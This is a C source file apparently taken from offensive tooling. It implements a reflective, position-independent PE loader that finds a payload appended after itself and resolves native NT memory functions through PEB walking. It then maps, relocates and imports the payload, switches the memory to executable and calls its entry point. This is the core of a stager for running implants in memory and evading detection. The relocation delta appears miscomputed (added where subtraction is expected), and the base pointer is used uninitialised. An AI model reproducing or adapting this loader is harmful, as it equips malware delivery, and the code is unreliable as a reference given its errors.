#include "../include/Loader.h"
#include "../include/Macros.h"
#include "../include/Peb.h"

typedef BOOLEAN ( WINAPI* DLLMAIN_T ) (
	HMODULE ImageBase,
	DWORD Reason,
	LPVOID Parameter
);

void Pipedream(void) {
	// Loader Vars
  NTSTATUS status;
	DLLMAIN_T Ent;
	LPVOID pe_base;
	RELOC_CTX rcRelocCtx;
	DWORD dwOldProtect;
	// PE bullshit
	PIMAGE_DOS_HEADER Dos = C_PTR( G_END(  ) );
	PIMAGE_NT_HEADERS NtH = C_PTR( U_PTR( Dos ) + Dos->e_lfanew );
	IMAGE_DATA_DIRECTORY import_dir;
	PIMAGE_IMPORT_DESCRIPTOR import_desc;
	SIZE_T szSizeImage;
	DWORD_PTR pdwDelta;
	
	// Calc memory for image
	szSizeImage = (((NtH->OptionalHeader.SizeOfImage) + 0x1000 - 1) & ~(0x1000 - 1));
	
	fn_NtAllocateVirtualMemory pdNtAllocateVirtualMemory = (fn_NtAllocateVirtualMemory)pdGetProcAddress(pdGetModuleHandle(NTDLL, NULL, NULL), NT_VIRTUAL_ALLOC, 0);

	// Alloc memory for image
	status = pdNtAllocateVirtualMemory(
		(HANDLE)((HANDLE)-1),
		&pe_base,
		0,
		&szSizeImage,
		MEM_RESERVE | MEM_COMMIT,
		PAGE_READWRITE
	);
	if (status != STATUS_SUCCESS || pe_base == NULL) {
		return;
	}

	// Copy sections
	pdCopySections(IMAGE_FIRST_SECTION(NtH), NtH->FileHeader.NumberOfSections, 0, pe_base, C_PTR(NULL)); // HERE BASE OF FILE

	// Perform relocations
	pdwDelta = (DWORD_PTR)pe_base + (DWORD_PTR)NtH->OptionalHeader.ImageBase;
	rcRelocCtx.szRelocsProcessed = 0;
	rcRelocCtx.iddRelocDir = NtH->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
	rcRelocCtx.pdwRelocTable = rcRelocCtx.iddRelocDir.VirtualAddress + (DWORD_PTR)pe_base;
	rcRelocCtx.lpImgBase = pe_base;

	pdPerformRelocs(&rcRelocCtx, pdwDelta);

	// Resolve imports
	import_dir = NtH->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
	import_desc = (PIMAGE_IMPORT_DESCRIPTOR)(import_dir.VirtualAddress + (DWORD_PTR)pe_base);
	pdLoadImports(import_desc, pe_base);

	// Change permissions to R_X
	fn_NtProtectVirtualMemory pdNtProtectVirtualMemory = (fn_NtProtectVirtualMemory)pdGetProcAddress(pdGetModuleHandle(NTDLL, NULL, NULL), NT_VIRTUAL_PROTECT, 0);
	status = pdNtProtectVirtualMemory(
		(HANDLE)((HANDLE)-1),
		&pe_base,
		&szSizeImage,
		PAGE_EXECUTE_READ,
		&dwOldProtect
	);
	if (status != STATUS_SUCCESS) {
		return;
	}


	// Execute
	Ent = C_PTR( U_PTR( pe_base ) + NtH->OptionalHeader.AddressOfEntryPoint );
	Ent( G_SYM( Start ), 1, NULL );
	Ent( G_SYM( Start ), 4, NULL );

	return;

}
